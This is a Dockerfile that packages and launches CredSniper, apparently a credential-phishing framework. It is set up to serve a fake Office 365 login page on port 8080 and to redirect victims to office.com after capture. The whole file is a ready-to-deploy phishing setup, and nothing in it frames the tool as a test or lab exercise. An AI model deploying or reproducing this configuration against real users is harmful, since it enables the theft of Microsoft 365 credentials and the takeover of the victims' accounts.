FROM python:3.11-slim
RUN apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y unzip wget && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY CredSniper /app/CredSniper
RUN pip install --no-cache-dir -r /app/CredSniper/requirements.txt
ENV HOSTNAME_ENV=example.com
ENV FINAL_URL=https://www.office.com/?auth=2
EXPOSE 8080
CMD ["sh","-c","python /app/CredSniper/credsniper.py --module office365 --port ${PORT:-8080} --final ${FINAL_URL} --hostname ${HOSTNAME_ENV}"] 